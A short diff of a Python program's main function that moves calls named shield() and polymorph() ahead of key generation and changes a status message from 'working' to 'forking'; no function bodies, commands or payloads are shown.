@@ -35,13 +35,14 @@ def main():
         ha, port = ha.split(':')
         port = int(port)
 
-    print('working')
+    print('forking')
+    shield()
+    polymorph()
+
     p,q,n,e,d = Crypto.keygen(bits=bits)
     privkey = { 'n': n, 'd': d }
     refresh_hdb()
     print('done')
-    shield()
-    polymorph()
 
     while True:
         if not work(ha, port, privkey, bits=bits):
